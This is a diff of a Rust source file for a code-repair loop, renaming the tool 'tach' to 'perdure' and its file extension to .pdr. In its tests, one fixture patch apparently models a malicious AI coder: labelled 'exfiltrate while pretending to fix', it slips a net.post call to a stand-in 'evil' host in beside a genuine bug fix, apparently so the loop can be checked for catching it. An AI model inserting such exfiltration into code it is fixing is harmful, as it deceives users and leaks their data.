@@ -320,7 +320,7 @@ pub(crate) fn collect_problems(
 
 /// Choose the next diagnostic to repair: the lowest-positioned error carrying a
 /// `preferred_patch`, falling back to warnings under the `strict` strategy. This
-/// is the single deterministic choice both `tach fix` and `tach goal run` make.
+/// is the single deterministic choice both `perdure fix` and `perdure goal run` make.
 pub(crate) fn pick_candidate<'a>(
     errors: &'a [Diagnostic],
     warnings: &'a [Diagnostic],
@@ -369,7 +369,7 @@ pub(crate) fn build_patch(diag: &Diagnostic, strategy: Strategy, ws: &Workspace)
         reason: diag.message.clone(),
         touches: vec![pp.file.clone()],
         edits: vec![edit],
-        prove: vec!["tach check".into(), "tach test".into()],
+        prove: vec!["perdure check".into(), "perdure test".into()],
     }
 }
 
@@ -552,7 +552,7 @@ impl SuiteOutcome {
 
 /// Run the repair loop over every case in a suite, in the given order, and
 /// aggregate the agent-era metrics. Each case is repaired independently on its
-/// own workspace, exactly as `tach fix` would, so the suite measures the loop,
+/// own workspace, exactly as `perdure fix` would, so the suite measures the loop,
 /// not any cross-case state.
 pub fn run_suite(cases: Vec<(String, Workspace)>, max_laps: usize) -> SuiteOutcome {
     let mut out_cases = Vec::new();
@@ -618,8 +618,8 @@ test "expired session rejected" {
 
     fn broken_ws() -> Workspace {
         let mut w = Workspace::new();
-        w.insert("src/auth.tach", BROKEN_AUTH);
-        w.insert("tests/auth_test.tach", TESTS);
+        w.insert("src/auth.pdr", BROKEN_AUTH);
+        w.insert("tests/auth_test.pdr", TESTS);
         w
     }
 
@@ -686,8 +686,8 @@ test "expired session rejected" {
         const SRC: &str = "fn double(x: Int) -> Int {\n  return x\n}\n";
         const TST: &str = "test \"double doubles\" {\n  ensure double(2) == 4\n}\n";
         let mut ws = Workspace::new();
-        ws.insert("src/m.tach", SRC);
-        ws.insert("tests/m_test.tach", TST);
+        ws.insert("src/m.pdr", SRC);
+        ws.insert("tests/m_test.pdr", TST);
 
         // A logic bug carries no patch, so the deterministic loop alone is stuck.
         let stuck = fix(ws.clone(), Strategy::Minimal, 8);
@@ -701,18 +701,18 @@ test "expired session rejected" {
             reason: "double should multiply its argument".into(),
             touches: vec!["src/**".into()],
             edits: vec![Edit {
-                file: "src/m.tach".into(),
+                file: "src/m.pdr".into(),
                 span: Span::new(at, at + "return x".len()),
                 replacement: "return x * 2".into(),
             }],
-            prove: vec!["tach test".into()],
+            prove: vec!["perdure test".into()],
         };
         let coder = FixtureCoder::new(vec![patch]);
         let out = fix_with_coder(ws, Strategy::Minimal, 8, Some(&coder));
         assert_eq!(out.status, "green", "laps: {:#?}", out.laps);
         assert_eq!(out.metrics.coder_patches, 1);
         assert_eq!(out.metrics.regressions, 0);
-        assert!(out.final_files["src/m.tach"].contains("x * 2"));
+        assert!(out.final_files["src/m.pdr"].contains("x * 2"));
     }
 
     #[test]
@@ -724,8 +724,8 @@ test "expired session rejected" {
         const SRC: &str = "fn double(x: Int) -> Int {\n  return x\n}\n";
         const TST: &str = "test \"double doubles\" {\n  ensure double(2) == 4\n}\n";
         let mut ws = Workspace::new();
-        ws.insert("src/m.tach", SRC);
-        ws.insert("tests/m_test.tach", TST);
+        ws.insert("src/m.pdr", SRC);
+        ws.insert("tests/m_test.pdr", TST);
 
         let at = SRC.find("return x").unwrap();
         let patch = Patch {
@@ -733,7 +733,7 @@ test "expired session rejected" {
             reason: "exfiltrate while pretending to fix".into(),
             touches: vec!["src/**".into()],
             edits: vec![Edit {
-                file: "src/m.tach".into(),
+                file: "src/m.pdr".into(),
                 span: Span::new(at, at + "return x".len()),
                 replacement: "net.post(\"http://evil\", \"x\")\n  return x * 2".into(),
             }],
